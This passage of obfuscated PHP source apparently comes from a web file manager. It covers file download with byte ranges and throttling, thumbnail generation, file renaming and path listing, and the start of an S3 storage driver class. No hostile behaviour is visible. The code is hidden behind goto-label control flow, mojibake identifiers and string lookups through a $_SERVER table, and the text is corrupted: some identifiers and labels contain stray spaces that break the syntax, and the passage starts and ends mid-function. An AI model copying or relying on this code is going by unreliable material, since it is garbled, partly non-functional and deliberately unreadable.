fê”Ä£‰õù: $cŠÑ‹¾ÕÅ¿ = !0; if ($_SERVER[$Fåé¶Ö½[153]] == $Fåé¶Ö½[154] && $DèóŒ†ßÙ > 1204 * 1024 * 1024 * 2) { $cŠÑ‹¾ÕÅ¿ = !1; } if ($cŠÑ‹¾ÕÅ¿) { header($Fåé¶Ö½[155] . ($A´„ÆÕÙ - $cÅº¢œÃæ‰ + 1)); } goto BäÑ•Éƒ ô; f´Ä¼•×Š¿: if (in_array($f¢îĞÆ¾ì¡, array($Fåé¶Ö½[110], $Fåé¶Ö½[111], $Fåé¶Ö½[112], $Fåé¶Ö½[113]))) { $f¢îĞÆ¾ì¡ = $Fåé¶Ö½[114]; } if (!$fµ´İ•¹•Å) { $fµ´İ•¹•Å = md5($bøø²ÜµÕí . $this->hashSimple($E³™ëÎ¸ã)); } $fµ´İ•¹•Å = $Fåé¶Ö½[115] . $fµ´İ•¹•Å . $Fåé¶Ö½[115]; goto e¸ÔÚ±´‡; a•µÂ„³”ñ: header($Fåé¶Ö½[134] . $bøø²ÜµÕí . $Fåé¶Ö½[126]); header($Fåé¶Ö½[135] . $féñ­¿ÇÕ°); header($Fåé¶Ö½[136]); goto DÂï¹æĞ÷; AÊß¶ƒœÜ‹: $cÅº¢œÃæ‰ = 0; $A´„ÆÕÙ = $DèóŒ†ßÙ - 1; $f¢îĞÆ¾ì¡ = $this->ext($féñ­¿ÇÕ°); goto f´Ä¼•×Š¿; F¾ÎÀğ¶È‹: $Fåé¶Ö½ =& $_SERVER[Æ¼ôºÙï]; $this->cacheMethod(null, null); if (!$E³™ëÎ¸ã || !$this->exist($E³™ëÎ¸ã)) { show_json(LNG($Fåé¶Ö½[104]), !1, $DÉ»‚Ïœ); } goto dô‘Úö; e¸ÔÚ±´‡: $E—»¢Ò¸‰µ = get_file_mime($f¢îĞÆ¾ì¡); if (strstr($E—»¢Ò¸‰µ, $Fåé¶Ö½[116])) { $E—»¢Ò¸‰µ = $E—»¢Ò¸‰µ . $Fåé¶Ö½[117]; } if ($bŞ’ÀÈ ”Å === !1 && !mime_support($E—»¢Ò¸‰µ)) { $bŞ’ÀÈ ”Å = !0; $E—»¢Ò¸‰µ = $Fåé¶Ö½[118]; } goto D‘Øõ°µòÕ; dô‘Úö: $a¹·íÂ­½ = $this->getType() == $Fåé¶Ö½[105]; $aˆğê‰Ù¨Â = $GLOBALS[$Fåé¶Ö½[6]][$Fåé¶Ö½[87]][$Fåé¶Ö½[106]][$Fåé¶Ö½[107]]; $C‘£§èÓß¡ = (double) $GLOBALS[$Fåé¶Ö½[6]][$Fåé¶Ö½[87]][$Fåé¶Ö½[106]][$Fåé¶Ö½[108]] * 1024 * 1024; goto Có§ëñ½„†; AÁ‘â‘ë«: $E™ŠÈÍÇÇ = strtolower($_SERVER[$Fåé¶Ö½[141]]); if ($a¹·íÂ­½ && $E™ŠÈÍÇÇ && $aˆğê‰Ù¨Â) { if (strstr($E™ŠÈÍÇÇ, $Fåé¶Ö½[142])) { header($Fåé¶Ö½[143] . $E³™ëÎ¸ã); } else { if (strstr($E™ŠÈÍÇÇ, $Fåé¶Ö½[144])) { header($Fåé¶Ö½[145] . $E³™ëÎ¸ã); } else { if (strstr($E™ŠÈÍÇÇ, $Fåé¶Ö½[146])) { header($Fåé¶Ö½[147] . $E³™ëÎ¸ã); } } } if ($C‘£§èÓß¡) { header($Fåé¶Ö½[148] . $C‘£§èÓß¡); } return; } if (isset($_SERVER[$Fåé¶Ö½[149]])) { if (preg_match($Fåé¶Ö½[150], $_SERVER[$Fåé¶Ö½[149]], $Cğ¯ó˜ã)) { $cÅº¢œÃæ‰ = intval($Cğ¯ó˜ã[1]); if (!empty($Cğ¯ó˜ã[2])) { $A´„ÆÕÙ = intval($Cğ¯ó˜ã[2]); } } header($Fåé¶Ö½[151]); header("\x43\157\156\x74\145\156\x74\x2d\x52\141\x6e\x67\145\x3a\x20\142\x79\164\x65\163\40{$cÅº¢œÃæ‰}\55{$A´„ÆÕÙ}\57" . $DèóŒ†ßÙ); } else { header($Fåé¶Ö½[152]); } goto fê”Ä£‰õù; f®ºê£«Ø: $A‘¬êÆµƒ¤ = $Fåé¶Ö½[115] . $A‘¬êÆµƒ¤ . $Fåé¶Ö½[121] . $A‘¬êÆµƒ¤; if ($bŞ’ÀÈ ”Å) { header($Fåé¶Ö½[122]); header($Fåé¶Ö½[123] . $A‘¬êÆµƒ¤); } else { header($Fåé¶Ö½[124] . $A‘¬êÆµƒ¤); } header($Fåé¶Ö½[125] . gmdate($Fåé¶Ö½[109], time() + 3600 * 24 * 30) . $Fåé¶Ö½[126]); goto EßÜâ‚æ÷; BäÑ•Éƒ ô: if ($_SERVER[$Fåé¶Ö½[156]] == $Fåé¶Ö½[157]) { return; } $Cå”îÒÖĞ± = 1024 * 100; $Fùä¦‘ˆË´ = 0; goto B™¼¦¬å‘; B™¼¦¬å‘: if ($C‘£§èÓß¡) { $Fùä¦‘ˆË´ = intval(1000 * 1000 * ($Cå”îÒÖĞ± / $C‘£§èÓß¡)); } while ($cÅº¢œÃæ‰ <= $A´„ÆÕÙ) { $e©¡â„àä¯ = timeFloat(); check_abort(); $d™ïÚ·§†ö = $A´„ÆÕÙ - $cÅº¢œÃæ‰ + 1; if ($d™ïÚ·§†ö <= $Cå”îÒÖĞ±) { $Cå”îÒÖĞ± = $d™ïÚ·§†ö; } echo $this->fileSubstr($E³™ëÎ¸ã, $cÅº¢œÃæ‰, $Cå”îÒÖĞ±); $cÅº¢œÃæ‰ += $Cå”îÒÖĞ±; if ($Cå”îÒÖĞ± == $d™ïÚ·§†ö) { $cÅº¢œÃæ‰ = $A´„ÆÕÙ + 1; } if ($Fùä¦‘ˆË´) { $BÍ‹À®·Öº = intval(1000 * 1000 * (timeFloat() - $e©¡â„àä¯)); $c¡£ğ”“‡Á = $Fùä¦‘ˆË´ - $BÍ‹À®·Öº; if ($c¡£ğ”“‡Á > 5) { usleep($c¡£ğ”“‡Á); } } } goto aØÊ¶£—; Có§ëñ½„†: @ob_end_clean(); set_timeout(); $c©£ÓœªÉƒ = $this->infoFull($E³™ëÎ¸ã); goto aà¤Âæ·¶ğ; aà¤Âæ·¶ğ: $DèóŒ†ßÙ = $c©£ÓœªÉƒ[$Fåé¶Ö½[77]]; $bøø²ÜµÕí = gmdate($Fåé¶Ö½[109], $c©£ÓœªÉƒ[$Fåé¶Ö½[83]]); $féñ­¿ÇÕ° = $DÉ»‚Ïœ ? $DÉ»‚Ïœ : $this->iconvApp($c©£ÓœªÉƒ[$Fåé¶Ö½[28]]); goto AÊß¶ƒœÜ‹; aØÊ¶£—: } public function fileOutServer($fÌğÑÆŠ†, $a†¡®ğÜšñ = false, $FÄÔœ¦¬Õ‡ = false, $FÃ¦¢­Ã = '') { $this->fileOut($fÌğÑÆŠ†, $a†¡®ğÜšñ, $FÄÔœ¦¬Õ‡, $FÃ¦¢­Ã); } public function fileOutLink($AÎ¤Å‹¤Ò˜) { header($_SERVER[Æ¼ôºÙï][158] . $AÎ¤Å‹¤Ò˜); die; } public function cacheMethod($b¸³–ò˜‹Ÿ, $c„¹«÷‚è£, $Fõ­¦ñ©çÂ = null) { goto AÊë¨¥ô••; bÅ°×áŞİ: $eÀÖ Ç¿‚ = $cÏÎ«¢¬Â•[159] . $b¸³–ò˜‹Ÿ . $cÏÎ«¢¬Â•[160] . rtrim($DºÒ·¦ƒ, $cÏÎ«¢¬Â•[8]); if (is_null($b¸³–ò˜‹Ÿ)) { $aŠ¯ğ³´ãë = array(); return; } if (is_null($c„¹«÷‚è£)) { unset($aŠ¯ğ³´ãë[$eÀÖ Ç¿‚]); return; } goto a†±§‹¯…Ò; AÊë¨¥ô••: $cÏÎ«¢¬Â• =& $_SERVER[Æ¼ôºÙï]; static $aŠ¯ğ³´ãë = array(); $DºÒ·¦ƒ = $c„¹«÷‚è£ ? ltrim($this->getPathOuter($c„¹«÷‚è£), $cÏÎ«¢¬Â•[8]) : $c„¹«÷‚è£; goto bÅ°×áŞİ; a‡„İ³½Ó‡: $AÃ¾àğï‹‡ = $this->{$b¸³–ò˜‹Ÿ}($c„¹«÷‚è£); $aŠ¯ğ³´ãë[$eÀÖ Ç¿‚] = $AÃ¾àğï‹‡; return $AÃ¾àğï‹‡; goto Dã¼­¨×†Š; a†±§‹¯…Ò: if (!is_null($Fõ­¦ñ©çÂ)) { $aŠ¯ğ³´ãë[$eÀÖ Ç¿‚] = $Fõ­¦ñ©çÂ; return; } $AÃ¾àğï‹‡ = isset($aŠ¯ğ³´ãë[$eÀÖ Ç¿‚]) ? $aŠ¯ğ³´ãë[$eÀÖ Ç¿‚] : null; if (!is_null($AÃ¾àğï‹‡)) { return $AÃ¾àğï‹‡; } goto a‡„İ³½Ó‡; Dã¼­¨×†Š: } public function fileOutImage($dœŠÓ†˜Š, $e¾±è‘‹Ö = 250) { goto cèƒŞÎ¢ĞŠ; e²æéŠˆšÔ: IO::fileOut($E«Âèç±Š); goto A‹Ÿ¦Õ±àŞ; b­‹¬á‡„­: $DÕ„‚—‡ñ” = DATA_THUMB . $E«¦çÖˆ–«; del_file($DÕ„‚—‡ñ”); if (!@file_exists($DÕ„‚—‡ñ”)) { $d™Õ£¼œ«Ò = TEMP_FILES; if (!is_dir($d™Õ£¼œ«Ò)) { mk_dir($d™Õ£¼œ«Ò); } $d›¯ğÕÂĞ = $d™Õ£¼œ«Ò . $eœ¡÷…¹ . $CÂ÷«ÔÍ„É[94] . $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[167]]; if (!@file_exists($d›¯ğÕÂĞ)) { $d›¯ğÕÂĞ = $this->download($dœŠÓ†˜Š, $d›¯ğÕÂĞ); } $A‰‚–ÃİÓ = new ImageThumb($d›¯ğÕÂĞ, $CÂ÷«ÔÍ„É[173]); $A‰‚–ÃİÓ->prorate($DÕ„‚—‡ñ”, $e¾±è‘‹Ö, $e¾±è‘‹Ö * 10); } goto c´£ö´İÅÒ; c¥¦µ”ö¦÷: if (!($eäåö’ÄĞ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $CÂ÷«ÔÍ„É[171]))) { $A Ô®·î»Ë = IO::mkdir(IO_PATH_SYSTEM_TEMP . $CÂ÷«ÔÍ„É[172]); } else { $A Ô®·î»Ë = KodIO::make($eäåö’ÄĞ); } if ($eäåö’ÄĞ = IO::fileNameExist($A Ô®·î»Ë, $E«¦çÖˆ–«)) { $DÕ„‚—‡ñ” = KodIO::make($eäåö’ÄĞ); return IO::fileOut($DÕ„‚—‡ñ”, !1, $a‰ˆÑô‡‘´); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto b­‹¬á‡„­; c´£ö´İÅÒ: if (!file_exists($DÕ„‚—‡ñ”) || filesize($DÕ„‚—‡ñ”) < 100) { return @file_exists($d›¯ğÕÂĞ) ? IO::fileOut($d›¯ğÕÂĞ) : $this->fileOut($dœŠÓ†˜Š); } if (!($E«Âèç±Š = IO::move($DÕ„‚—‡ñ”, $A Ô®·î»Ë))) { return IO::fileOut($DÕ„‚—‡ñ”); } del_file($DÕ„‚—‡ñ”); goto e²æéŠˆšÔ; cèƒŞÎ¢ĞŠ: $CÂ÷«ÔÍ„É =& $_SERVER[Æ¼ôºÙï]; if (substr($dœŠÓ†˜Š, 0, 4) == $CÂ÷«ÔÍ„É[146]) { $this->fileOutLink($dœŠÓ†˜Š); } $c¹˜š„ô’‘ = $this->info($dœŠÓ†˜Š); goto e™¯‹ÄÏƒ; dÛø‡Ò¿›È: if ($c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[77]] <= 1024 * 50 || $Fƒàîø’Ğå || !function_exists($CÂ÷«ÔÍ„É[166]) || $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[167]] == $CÂ÷«ÔÍ„É[168]) { return $this->fileOut($dœŠÓ†˜Š, !1, $a‰ˆÑô‡‘´); } if (isset($c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]][$CÂ÷«ÔÍ„É[169]])) { $eœ¡÷…¹ = $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]][$CÂ÷«ÔÍ„É[169]]; } else { if (isset($c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]][$CÂ÷«ÔÍ„É[170]])) { $eœ¡÷…¹ = $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]][$CÂ÷«ÔÍ„É[170]]; } else { $eœ¡÷…¹ = md5("{$c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[28]]}\137{$c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[75]]}\137{$c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[77]]}"); } } $E«¦çÖˆ–« = "{$eœ¡÷…¹}\137{$e¾±è‘‹Ö}\x2e\160\x6e\x67"; goto c¥¦µ”ö¦÷; e™¯‹ÄÏƒ: $a‰ˆÑô‡‘´ = $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[28]]; $Fƒàîø’Ğå = !1; if (isset($GLOBALS[$CÂ÷«ÔÍ„É[161]]) && $GLOBALS[$CÂ÷«ÔÍ„É[161]][$CÂ÷«ÔÍ„É[75]] == $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[75]]) { $b©ÚÃÖî‰¢ = $GLOBALS[$CÂ÷«ÔÍ„É[161]][$CÂ÷«ÔÍ„É[162]]; if (!$c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]]) { $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]] = $GLOBALS[$CÂ÷«ÔÍ„É[161]]; } if (isset($b©ÚÃÖî‰¢[$CÂ÷«ÔÍ„É[164]])) { if ($b©ÚÃÖî‰¢[$CÂ÷«ÔÍ„É[164]] <= $e¾±è‘‹Ö && $b©ÚÃÖî‰¢[$CÂ÷«ÔÍ„É[165]] <= $e¾±è‘‹Ö) { $Fƒàîø’Ğå = !0; } } $a‰ˆÑô‡‘´ = $c¹˜š„ô’‘[$CÂ÷«ÔÍ„É[163]][$CÂ÷«ÔÍ„É[28]]; } goto dÛø‡Ò¿›È; A‹Ÿ¦Õ±àŞ: } public function fileOutImageServer($eÙˆÂÓĞ°ï, $CÌ¬¡Àîö‚ = 250) { $this->fileOutImage($eÙˆÂÓĞ°ï, $CÌ¬¡Àîö‚); } public function fileNameAuto($AŸß³¦‰È, $C¤˜‰òñÃ®, $E•à¬ğäô” = REPEAT_RENAME, $b‘••©ÁÖµ = false) { goto FÜœïİÔ…½; E……âä‘¥: while ($this->exist(rtrim($AŸß³¦‰È, $a†™Ùåµ¦”[8]) . $a†™Ùåµ¦”[8] . $B‚²»¾…åÎ)) { $B‚²»¾…åÎ = $A¢†¨ÆÆŠ . "\x28{$F«Îí°ÎŸê}\x29{$EëŸ‡í‘®¾}"; $F«Îí°ÎŸê++; } return $B‚²»¾…åÎ; goto a§å£½Òµç; Eì’‰ß˜õ™: $F«Îí°ÎŸê = 1; $A¢†¨ÆÆŠ = substr($C¤˜‰òñÃ®, 0, strlen($C¤˜‰òñÃ®) - strlen($EëŸ‡í‘®¾)); $B‚²»¾…åÎ = $A¢†¨ÆÆŠ . "\x28{$F«Îí°ÎŸê}\51{$EëŸ‡í‘®¾}"; goto E……âä‘¥; b´­å˜ˆ–°: if ($E•à¬ğäô” == REPEAT_SKIP) { return !1; } $EëŸ‡í‘®¾ = $a†™Ùåµ¦”[94] . get_path_ext($C¤˜‰òñÃ®); $EëŸ‡í‘®¾ = $EëŸ‡í‘®¾ == $a†™Ùåµ¦”[94] || $b‘••©ÁÖµ ? $a†™Ùåµ¦”[33] : $EëŸ‡í‘®¾; goto Eì’‰ß˜õ™; FÜœïİÔ…½: $a†™Ùåµ¦” =& $_SERVER[Æ¼ôºÙï]; $C÷Š÷êõ“‘ = $AŸß³¦‰È === $a†™Ùåµ¦”[33] ? $C¤˜‰òñÃ® : rtrim($AŸß³¦‰È, $a†™Ùåµ¦”[8]) . $a†™Ùåµ¦”[8] . $C¤˜‰òñÃ®; if ($E•à¬ğäô” == REPEAT_REPLACE || !$this->exist($C÷Š÷êõ“‘) || $b‘••©ÁÖµ && $E•à¬ğäô” != REPEAT_RENAME_FOLDER) { return $C¤˜‰òñÃ®; } goto b´­å˜ˆ–°; a§å£½Òµç: } public function listAllFiles($CÛŸÓ, $a¥ê‡Ú×í, $c’‡’âˆÏ’ = array()) { goto Bñïåö¬; Bñïåö¬: $cŸà§­äˆ¥ =& $_SERVER[Æ¼ôºÙï]; if (empty($a¥ê‡Ú×í)) { return array(); } $c¿ÛÏ˜Ì× = array(); goto fÓÙ²š©˜Ö; fÓÙ²š©˜Ö: $CÛŸÓ = trim($CÛŸÓ, $cŸà§­äˆ¥[8]); foreach ($a¥ê‡Ú×í as $FŠ¿‰ßâ“) { $DÂäáåß¾ = ltrim(substr(trim($FŠ¿‰ßâ“, $cŸà§­äˆ¥[8]), strlen($CÛŸÓ)), $cŸà§­äˆ¥[8]); $c¿ÛÏ˜Ì× = array_merge($c¿ÛÏ˜Ì×, $this->slicePath($DÂäáåß¾)); } $Eô¶ªÅ—Ù  = array(); goto cæ•ù¢»”š; cæ•ù¢»”š: foreach (array_unique($c¿ÛÏ˜Ì×) as $FŠ¿‰ßâ“) { $cëº¢¯š±Î = array($cŸà§­äˆ¥[75] => $this->getPathOuter($cŸà§­äˆ¥[8] . $CÛŸÓ . $cŸà§­äˆ¥[8] . $FŠ¿‰ßâ“), $cŸà§­äˆ¥[76] => 1, $cŸà§­äˆ¥[77] => 0); if (substr($FŠ¿‰ßâ“, -1) != $cŸà§­äˆ¥[8]) { $cëº¢¯š±Î[$cŸà§­äˆ¥[76]] = 0; $dßëµ‹Ó¹ = $this->getPath($CÛŸÓ . $cŸà§­äˆ¥[8] . $FŠ¿‰ßâ“); $cëº¢¯š±Î[$cŸà§­äˆ¥[77]] = isset($c’‡’âˆÏ’[$dßëµ‹Ó¹]) ? $c’‡’âˆÏ’[$dßëµ‹Ó¹] : $this->size($dßëµ‹Ó¹); } $Eô¶ªÅ—Ù [] = $cëº¢¯š±Î; } return $Eô¶ªÅ—Ù ; goto B±»… ŒåÆ; B±»… ŒåÆ: } public function slicePath($Dù÷âÅŠÔ) { $bÎ¾›‰æğ =& $_SERVER[Æ¼ôºÙï]; $cÍàÊ›î¦ = explode($bÎ¾›‰æğ[8], trim($Dù÷âÅŠÔ, $bÎ¾›‰æğ[8])); $a„ÖëÌâô = 0; do { ++$a„ÖëÌâô; $E…ƒå±çå„[] = implode($bÎ¾›‰æğ[8], array_slice($cÍàÊ›î¦, 0, $a„ÖëÌâô)) . $bÎ¾›‰æğ[8]; } while ($a„ÖëÌâô < count($cÍàÊ›î¦)); $E…ƒå±çå„[count($cÍàÊ›î¦) - 1] = $Dù÷âÅŠÔ; return $E…ƒå±çå„; } public function getHost() { $b²œÕ¬æ‡è =& $_SERVER[Æ¼ôºÙï]; $EãªË‹Âˆ = parse_url(trim($this->domain, $b²œÕ¬æ‡è[8])); $dµ©ö²ÕÀ = isset($EãªË‹Âˆ[$b²œÕ¬æ‡è[174]]) ? $EãªË‹Âˆ[$b²œÕ¬æ‡è[174]] : http_type(); $Fğ÷ “¬©¼ = isset($EãªË‹Âˆ[$b²œÕ¬æ‡è[175]]) ? $EãªË‹Âˆ[$b²œÕ¬æ‡è[175]] : $EãªË‹Âˆ[$b²œÕ¬æ‡è[75]]; if (isset($EãªË‹Âˆ[$b²œÕ¬æ‡è[176]])) { $Fğ÷ “¬©¼ .= $b²œÕ¬æ‡è[4] . $EãªË‹Âˆ[$b²œÕ¬æ‡è[176]]; } return $dµ©ö²ÕÀ . $b²œÕ¬æ‡è[177] . $Fğ÷ “¬©¼; } public function pathEncode($aó›õï™ùÀ) { $D†°³‡óõÅ =& $_SERVER[Æ¼ôºÙï]; return str_replace($D†°³‡óõÅ[178], $D†°³‡óõÅ[8], rawurlencode($aó›õï™ùÀ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Dºôá‹®ã) { set_timeout(); require_once SDK_DIR . $_SERVER[Æ¼ôºÙï][179]; parent::__construct(); $this->_init($Dºôá‹®ã); } public function _init($dèŸ²†Ë) { foreach ($dèŸ²†Ë as $F°õéÃÎÛá => $cÜˆóƒ°•ï) { if (isset($this->{$F°õéÃÎÛá})) { $this->{$F°õéÃÎÛá} = $cÜˆóƒ°•ï; } } $this->endpoint = $dèŸ²†Ë[$_SERVER[Æ¼ôºÙï][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($aÏù“ ¸ = "\166\x34") { $this->signVer = $aÏù“ ¸; $this->client->setSignatureVersion($aÏù“ ¸); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto C¢×ùÈ´¯ö; DÛÅµŒ­±: $eŞ¯İÓ©× = array($C©çÉ‘ƒ‘í[186], $C©çÉ‘ƒ‘í[187], $C©çÉ‘ƒ‘í[188], $C©çÉ‘ƒ‘í[189], $C©çÉ‘ƒ‘í[190]); $eˆĞ¨¶¾„Š = array_diff($eŞ¯İÓ©×, $e¢ä‡ƒ×Ì); return empty($eˆĞ¨¶¾„Š); goto DÔ‡Ö„ôª; C¢×ùÈ´¯ö: $C©çÉ‘ƒ‘í =& $_SERVER[Æ¼ôºÙï]; $D‘»Ï»Œª = $this->getBucketCors(); if (!$D‘»Ï»Œª || !is_array($D‘»Ï»Œª)) { return !1; } goto E“Ó¡æ»ƒ; E“Ó¡æ»ƒ: if ($D‘»Ï»Œª[$C©çÉ‘ƒ‘í[181]] != $C©çÉ‘ƒ‘í[182] || $D‘»Ï»Œª[$C©çÉ‘ƒ‘í[183]] != $C©çÉ‘ƒ‘í[182]) { return !1; } $e¢ä‡ƒ×Ì = array_map($C©çÉ‘ƒ‘í[184], $D‘»Ï»Œª[$C©çÉ‘ƒ‘í[185]]); if (!is_array($e¢ä‡ƒ×Ì)) { $e¢ä‡ƒ×Ì = array(); } goto DÛÅµŒ­±; DÔ‡Ö„ôª: } public function mkfile($BãòŒ¤‡˜Õ, $e‹’ëâ¤á¶ = '', $bù‹Ä´´“¤ = REPEAT_RENAME) { $cËÅÂã¼½ = $this->setContent($BãòŒ¤‡˜Õ, $e‹’ëâ¤á¶); if ($cËÅÂã¼½ !== !1) { return $this->getPathOuter($BãòŒ¤‡˜Õ); } return !1; } public function mkdir($BÄÚÔôïì›, $c¹¥““˜×Á = REPEAT_SKIP) { if (empty($BÄÚÔôïì›)) { return !1; } if ($this->_isFolder($BÄÚÔôïì›)) { return $this->getPathOuter($BÄÚÔôïì›); } $AáÑâÈ¤¢Œ = $this->setContent($BÄÚÔôïì›, $_SERVER[Æ¼ôºÙï][33], !0); if ($AáÑâÈ¤¢Œ !== !1) { return $this->getPathOuter($BÄÚÔôïì›); } return !1; } public function copyFile($Aƒ„óˆ‹ËÇ, $fĞäß©–°, $d…®¥¾ƒ = array()) { $AÑÙ–ƒİÄ =& $_SERVER[Æ¼ôºÙï]; $DêğÀ˜‚÷à = $this->objectMeta($Aƒ„óˆ‹ËÇ); if (!$DêğÀ˜‚÷à) { return !1; } if ($DêğÀ˜‚÷à[$AÑÙ–ƒİÄ[77]] <= 1024 * 1024 * 200) { $DĞ‹Î´Êà = $this->client->copyObject($this->bucket, $Aƒ„óˆ‹ËÇ, $this->bucket, $fĞäß©–°, $AÑÙ–ƒİÄ[191], $d…®¥¾ƒ); } else { $DĞ‹Î´Êà = $this->client->multiCopyObject($this->bucket, $Aƒ„óˆ‹ËÇ, $this->bucket, $fĞäß©–°, $d…®¥¾ƒ); } $DĞ‹Î´Êà = $DĞ‹Î´Êà ? $this->getPathOuter($fĞäß©–°) : !1; return $DĞ‹Î´Êà; } public function moveFile($EÄÃóªåŠ, $aŞß”‚•) { if ($this->copyFile($EÄÃóªåŠ, $aŞß”‚•)) { $this->delFile($EÄÃóªåŠ); return $this->getPathOuter($aŞß”‚•); } return !1; } public function delFile($dŒ×ğÖ†’) { return $this->client->deleteObject($this->bucket, $dŒ×ğÖ†’); } public function delFolder($cŒ×ÕÌ‘¨) { goto e‹Ş‹ãÈ†á; CùÂïÙµÒ”: $B‚‹â·ˆ“« = $this->fileList($cŒ×ÕÌ‘¨); $this->listItemCache = !0; $A©Â»§—Ïå = trim($cŒ×ÕÌ‘¨, $EË½Óº¼è¯[8]) . $EË½Óº¼è¯[8]; goto Eãƒæ”íœ; e‹Ş‹ãÈ†á: $EË½Óº¼è¯ =& $_SERVER[Æ¼ôºÙï]; if (!$this->exist($cŒ×ÕÌ‘¨)) { return !0; } $this->listItemCache = !1; goto CùÂïÙµÒ”; Eãƒæ”íœ: if (!empty($cŒ×ÕÌ‘¨) && !in_array($A©Â»§—Ïå, $B‚‹â·ˆ“«[$EË½Óº¼è¯[74]])) { $B‚‹â·ˆ“«[$EË½Óº¼è¯[74]][] = $A©Â»§—Ïå; } $EÅ‡²¸·¥ù = $this->delByBatch($B‚‹â·ˆ“«[$EË½Óº¼è¯[73]]); if (!$EÅ‡²¸·¥ù) { return !1; } goto e¾¬Ôˆ“ñµ; e¾¬Ôˆ“ñµ: return $this->delByBatch($B‚‹â·ˆ“«[$EË½Óº¼è¯[74]]); goto eÚ¸«è„Ç; eÚ¸«è„Ç: } private function delByBatch($f×„Ë‘ßƒò) { foreach (array_chunk($f×„Ë‘ßƒò, 1000) as $f¶à©Óõ÷Ì) { $bîœáÃ«·Ä = $this->client->deleteObjects($this->bucket, $f¶à©Óõ÷Ì); if (!$bîœáÃ«·Ä) { return !1; } } return !0; } public function rename($eÇÀ´Òø¯, $d‹íÖ¾Úš) { return $this->renameObject($eÇÀ´Òø¯, $d‹íÖ¾Úš); } public function listPath($E±ç‚¯‚İø, $B’½»°¸ƒö = false) { $còõÜÄÏéî =& $_SERVER[Æ¼ôºÙï]; $cõŠÆÜĞÓ‘ = $this->fileList($E±ç‚¯‚İø, $còõÜÄÏéî[8], !0); foreach ($cõŠÆÜĞÓ‘[$còõÜÄÏéî[74]] as $EÁ‹Ã¥È©æ => $dğïõåŞ…õ) { $cõŠÆÜĞÓ‘[$còõÜÄÏéî[74]][$EÁ‹Ã¥È©æ] = $this->folderInfo($dğïõåŞ…õ, $B’½»°¸ƒö); } foreach ($cõŠÆÜĞÓ‘[$còõÜÄÏéî[73]] as $EÁ‹Ã¥È©æ => $dğïõåŞ…õ) { $cõŠÆÜĞÓ‘[$còõÜÄÏéî[73]][$EÁ‹Ã¥È©æ] = $this->fileInfo($dğïõåŞ…õ[$còõÜÄÏéî[28]], $B’½»°¸ƒö, $dğïõåŞ…õ); } return $cõŠÆÜĞÓ‘; } private function fileInfo($då÷– ›‰, $DÏÍ¤Ÿê´ô = false, $E¤¶¢“¢†Œ = array()) { goto Có¬¬‹Óİà; Có¬¬‹Óİà: $d°ïô³´ =& $_SERVER[Æ¼ôºÙï]; $b´¿èĞ¿ = array($d°ïô³´[28] => $this->pathThis($då÷– ›‰), $d°ïô³´[75] => $this->getPathOuter($då÷– ›‰), $d°ïô³´[29] => $d°ïô³´[173], $d°ïô³´[167] => $this->ext($då÷– ›‰), $d°ïô³´[77] => isset($E¤¶¢“¢†Œ[$d°ïô³´[77]]) ? $E¤¶¢“¢†Œ[$d°ïô³´[77]] : 0); if ($DÏÍ¤Ÿê´ô) { return $b´¿èĞ¿; } goto D¯‡Ÿ…ĞØ; BŒø™–ñ²Û: if (isset($E¤¶¢“¢†Œ[$d°ïô³´[195]])) { $b´¿èĞ¿[$d°ïô³´[83]] = $E¤¶¢“¢†Œ[$d°ïô³´[195]]; } if (isset($E¤¶¢“¢†Œ[$d°ïô³´[77]])) { $b´¿èĞ¿[$d°ïô³´[77]] = $E¤¶¢“¢†Œ[$d°ïô³´[77]]; } return $b´¿èĞ¿; goto fÏˆÄ¥é—ì; D¯‡Ÿ…ĞØ: $b´¿èĞ¿[$d°ïô³´[192]] = $b´¿èĞ¿[$d°ïô³´[83]] = 0; $b´¿èĞ¿[$d°ïô³´[193]] = $b´¿èĞ¿[$d°ïô³´[194]] = !0; if (empty($E¤¶¢“¢†Œ)) { $E¤¶¢“¢†Œ = $this->objectMeta($då÷– ›‰); if (!$E¤¶¢“¢†Œ) { return $b´¿èĞ¿; } } goto BŒø™–ñ²Û; fÏˆÄ¥é—ì: } private function folderInfo($A‹Ä®Ù‘ª¤, $eÎòŒÒŠƒ = false) { goto dáèÁ£ÇÁ; f’óË‡°á: return $AŠö¿‰ê²ò; goto E›•ÈÆ³õ; dáèÁ£ÇÁ: $fæöª®íõ¢ =& $_SERVER[Æ¼ôºÙï]; $AŠö¿‰ê²ò = array($fæöª®íõ¢[28] => $this->pathThis($A‹Ä®Ù‘ª¤), $fæöª®íõ¢[75] => $this->getPathOuter($fæöª®íõ¢[8] . $A‹Ä®Ù‘ª¤), $fæöª®íõ¢[29] => $fæöª®íõ¢[76]); if ($eÎòŒÒŠƒ) { return $AŠö¿‰ê²ò; } goto AÖ¬¥¿öåš; AÖ¬¥¿öåš: $AŠö¿‰ê²ò[$fæöª®íõ¢[192]] = $AŠö¿‰ê²ò[$fæöª®íõ¢[83]] = 0; $AŠö¿‰ê²ò[$fæöª®íõ¢[193]] = $AŠö¿‰ê²ò[$fæöª®íõ¢[194]] = !0; if ($A‹Ä®Ù‘ª¤ == $fæöª®íõ¢[33]) { return $AŠö¿‰ê²ò; } goto f—ŸÓ 